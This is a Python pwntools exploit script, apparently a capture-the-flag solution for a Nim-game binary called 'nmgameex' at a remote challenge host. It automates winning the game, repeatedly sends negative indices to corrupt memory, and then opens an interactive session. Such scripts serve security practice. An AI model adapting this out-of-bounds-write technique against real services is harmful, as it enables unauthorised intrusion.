from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './nmgameex'
HOST = '20.48.84.13'
PORT = 20003

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


r = start()
if args.D:
    debug(r, [])
def win():
    while(1):
        blob = r.recvuntil('\n', True).split(' ')
        s = 0
        m = 0
        for x in blob:
            # print '@@: ', hex(int(x))
            s ^= int(x)
            if m < int(x):
                m = int(x)
 
        heap = blob.index(str(m))
        nex = s % 0x4
        # print "AAAA", hex(nex)
        if len(blob) != 1:
            if m >= 3:
                select = (m - (m ^ nex)) % 4
            else:
                if nex == 3:
                    heap = blob.index(str(nex-1))
                    select = nex-2
                else:
                    heap = blob.index(str(nex))
                    select = nex
        else:
            select = nex
        # print hex(s), hex(nex), hex(select)
        # assert(select != 0) # its over
        # its not over
        if select == 0:
            select = 1
 
        if len(blob) == 1: 
            r.sendlineafter(']: ', str(select))
        else:
            r.sendlineafter(']: ', str(heap))
            r.sendlineafter(']: ', str(select))
        ret = r.recvuntil('\n')
        if 'Won!' in ret:
            return
r.recvuntil('...\n')
win()
for i in range(132):
    r.sendlineafter(']: ', '-4')
    r.sendlineafter(']: ', '3')
r.sendlineafter(']: ', '-4')
r.sendlineafter(']: ', '2')
r.recvuntil('\n')
win()

    
r.interactive()
r.close()
